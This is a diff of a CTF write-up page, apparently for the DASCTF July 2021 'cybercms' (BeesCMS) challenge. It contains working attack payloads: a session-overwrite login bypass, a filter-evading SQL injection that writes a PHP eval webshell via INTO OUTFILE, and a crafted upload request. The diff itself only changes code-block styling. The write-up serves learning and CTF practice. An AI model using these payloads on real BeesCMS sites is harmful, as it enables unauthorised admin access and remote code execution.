@@ -557,9 +557,9 @@
 <p><del>（不过貌似没啥用</del> 后来发现还是有用的</p>
 <hr>
 <h2 id="后台登录绕过-amp-上传"><a href="#后台登录绕过-amp-上传" class="headerlink" title="后台登录绕过 &amp; 上传"></a>后台登录绕过 &amp; 上传</h2><p>参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxNzkyOTgxMw==&amp;mid=2247486046&amp;idx=1&amp;sn=1b168a2f302f2cd4c97d23c22454a042">【代码审计】 beescms 变量覆盖漏洞导致后台登陆绕过分析</a>，<code>$_SESSION</code> 可以被任意覆盖。</p>
-<pre class="language-http" data-language="http"><code class="language-http">POST /
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /
 
-_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999</code></pre>
+_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210801235205533.png"></p>
 <p>然后直接可以访问后台了。</p>
 <p><a target="_blank" rel="noopener" href="http://xxxxxxxxxxx/admin/admin.php">http://xxxxxxxxxxx/admin/admin.php</a></p>
@@ -601,7 +601,7 @@ _SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999<
 <h2 id="SQL-注入写马（预期解）"><a href="#SQL-注入写马（预期解）" class="headerlink" title="SQL 注入写马（预期解）"></a>SQL 注入写马（预期解）</h2><p>害，赛后看了看大佬的 wp，么得办法，还是得走 SQL 注入写入文件呗。（佛了</p>
 <p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802224411440.png"></p>
 <p>再来看上面 diff 出来的关于 SQL 注入的语句。</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">fl_value</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">fl_value</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
 	<span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file
 |outfile/i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -617,27 +617,27 @@ _SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999<
 	<span class="token punctuation">}</span>
 	<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/0x/i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>过滤了空格，倒是把 <code>/*</code> 过滤去掉了，另外把一些关键词过滤为空了，双写绕过就完事了。</p>
 <p>根据代码里登录的 SQL 语句</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$rel</span><span class="token operator">=</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mysql'</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">fetch_asc</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select id,admin_name,admin_password,admin_purview,is_disable from "</span><span class="token operator">.</span><span class="token constant">DB_PRE</span><span class="token operator">.</span><span class="token string double-quoted-string">"admin where admin_name='"</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 0,1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	</code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$rel</span><span class="token operator">=</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mysql'</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">fetch_asc</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select id,admin_name,admin_password,admin_purview,is_disable from "</span><span class="token operator">.</span><span class="token constant">DB_PRE</span><span class="token operator">.</span><span class="token string double-quoted-string">"admin where admin_name='"</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 0,1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>构造 SQL</p>
-<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># select xxx into outfile xxx</span>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># select xxx into outfile xxx</span>
 <span class="token comment"># &lt;?php eval($_REQUEST['m']);?&gt;</span>
 
-admin<span class="token string">'/**/uni union on/**/seselectlect/**/null,null,null,null,0x3c3f706870206576616c28245f524551554553545b276d275d293b3f3e/**/in in to/**/outoutfilefile/**/'</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>upload<span class="token operator">/</span>miao<span class="token punctuation">.</span>php'<span class="token comment">#</span></code></pre>
+admin<span class="token string">'/**/uni union on/**/seselectlect/**/null,null,null,null,0x3c3f706870206576616c28245f524551554553545b276d275d293b3f3e/**/in in to/**/outoutfilefile/**/'</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>upload<span class="token operator">/</span>miao<span class="token punctuation">.</span>php'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><em>（咱也不知道为啥 <code>0x</code> 没被过滤为空，双写 <code>0x</code> 发现并没有被删除反而 SQL 执行报错了</em></p>
 <p><strong>Payload:</strong></p>
-<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> /admin/login.php?action=ck_login HTTP/1.1</span>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> /admin/login.php?action=ck_login HTTP/1.1</span>
 
-user=admin%27%2F%2A%2A%2Funi%20union%20on%2F%2A%2A%2Fseselectlect%2F%2A%2A%2Fnull%2Cnull%2Cnull%2Cnull%2C0x3c3f706870206576616c28245f524551554553545b276d275d293b3f3e%2F%2A%2A%2Fin%20in%20to%2F%2A%2A%2Foutoutfilefile%2F%2A%2A%2F%27%2Fvar%2Fwww%2Fhtml%2Fupload%2Fmiao%2Ephp%27%23&amp;password=miao&amp;code=&amp;submit=true&amp;submit.x=43&amp;submit.y=24</code></pre>
+user=admin%27%2F%2A%2A%2Funi%20union%20on%2F%2A%2A%2Fseselectlect%2F%2A%2A%2Fnull%2Cnull%2Cnull%2Cnull%2C0x3c3f706870206576616c28245f524551554553545b276d275d293b3f3e%2F%2A%2A%2Fin%20in%20to%2F%2A%2A%2Foutoutfilefile%2F%2A%2A%2F%27%2Fvar%2Fwww%2Fhtml%2Fupload%2Fmiao%2Ephp%27%23&amp;password=miao&amp;code=&amp;submit=true&amp;submit.x=43&amp;submit.y=24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 
 <p>当然也可以用 <code>char</code> 函数写入木马。</p>
-<pre class="language-sql" data-language="sql"><code class="language-sql">admin<span class="token string">'/**/uni union on/**/seselectlect/**/null,null,null,null,char(60,63,112,104,112,32,101,118,97,108,40,36,95,82,69,81,85,69,83,84,91,39,109,39,93,41,59,63,62)/**/in in to/**/outoutfilefile/**/'</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>upload<span class="token operator">/</span>miao<span class="token punctuation">.</span>php'<span class="token comment">#</span></code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">admin<span class="token string">'/**/uni union on/**/seselectlect/**/null,null,null,null,char(60,63,112,104,112,32,101,118,97,108,40,36,95,82,69,81,85,69,83,84,91,39,109,39,93,41,59,63,62)/**/in in to/**/outoutfilefile/**/'</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>upload<span class="token operator">/</span>miao<span class="token punctuation">.</span>php'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>进去发现果然 MySQL 就是 root 用户起来的，于是就能写入文件。</p>
 <p>而 PHP 运行在 <code>www-data</code> 用户，<code>/var/www/html</code> 目录是给 <code>www-data</code> 用户了，但子目录没递归变更属主也没给写入权限就离谱。</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ps</span> -ef
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ps</span> -ef
 PID   <span class="token environment constant">USER</span>     TIME  COMMAND
    <span class="token number">1</span> root      <span class="token number">0</span>:07 /bin/sh /usr/local/bin/docker-php-entrypoint
    <span class="token number">10</span> root      <span class="token number">0</span>:21 /usr/bin/mysqld --user<span class="token operator">=</span>root --skip-name-resolve --skip-networking<span class="token operator">=</span><span class="token number">0</span>
@@ -647,7 +647,7 @@ PID   <span class="token environment constant">USER</span>     TIME  COMMAND
    <span class="token number">62</span> www-data  <span class="token number">0</span>:00 php-fpm: pool www
    <span class="token number">63</span> www-data  <span class="token number">0</span>:01 php-fpm: pool www
 <span class="token number">19798</span> root      <span class="token number">0</span>:00 <span class="token function">sleep</span> 5s
-<span class="token number">19799</span> www-data  <span class="token number">0</span>:00 <span class="token function">ps</span> -ef</code></pre>
+<span class="token number">19799</span> www-data  <span class="token number">0</span>:00 <span class="token function">ps</span> -ef<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>也有可能预期解就只有这条路可走吧。</p>
 <p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802234358803.png"></p>
 <p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802234501858.png"></p>
@@ -661,7 +661,7 @@ PID   <span class="token environment constant">USER</span>     TIME  COMMAND
 <p>上传以后抓包修改几个地方，看图。</p>
 <p>也就是让 <code>move_uploaded_file</code> 结果是移动到网站根目录下。</p>
 <p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803011233130.png"></p>
-<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> /admin/admin_pic.php?nav=pic_list&amp;admin_p_nav=content HTTP/1.1</span>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> /admin/admin_pic.php?nav=pic_list&amp;admin_p_nav=content HTTP/1.1</span>
 <span class="token header-name keyword">Host:</span> a10f5ec3-1cae-476e-bb23-31ed556086dd.node4.buuoj.cn
 <span class="token header-name keyword">Content-Length:</span> 1546
 <span class="token header-name keyword">Cache-Control:</span> max-age=0
@@ -735,7 +735,7 @@ img/202107070904261782_thumb.jpeg
 
 确定
 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL--
-</code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><code>pic_path</code> 留空也行。</p>
 <p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803010426175.png"></p>
 <p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803010201021.png"></p>
@@ -744,7 +744,7 @@ img/202107070904261782_thumb.jpeg
 <p>喵喵落泪（</p>
 <hr>
 <p>又想了想，寻思着是不是 <code>iconv</code> 的锅啊，上传经过这个函数时候东西都没了……</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// 第一个上传点</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 第一个上传点</span>
 <span class="token comment">// includes/fun.php#588-590</span>
 <span class="token variable">$up_file_name</span><span class="token operator">=</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$pic_alt</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'YmdHis'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$pic_alt</span><span class="token punctuation">;</span>
 <span class="token variable">$up_file_name2</span><span class="token operator">=</span><span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'GBK'</span><span class="token punctuation">,</span><span class="token variable">$up_file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -753,7 +753,7 @@ img/202107070904261782_thumb.jpeg
 <span class="token comment">// 第二个上传点</span>
 <span class="token comment">// admin/admin_pic.php#64-65</span>
 <span class="token variable">$pic_name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//图片名称</span>
-<span class="token variable">$pic_name</span> <span class="token operator">=</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'GBK'</span><span class="token punctuation">,</span><span class="token variable">$pic_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<span class="token variable">$pic_name</span> <span class="token operator">=</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'GBK'</span><span class="token punctuation">,</span><span class="token variable">$pic_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>phpinfo 看一眼。</p>
 <p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803014834724.png"></p>
 <p>好家伙，看起来是因为没 <a target="_blank" rel="noopener" href="https://www.gnu.org/software/libiconv/">libiconv</a> 或者 <a target="_blank" rel="noopener" href="http://www.gnu.org/software/libc/">glibc</a>，所以这里面东西就变成空了……没事了。</p>
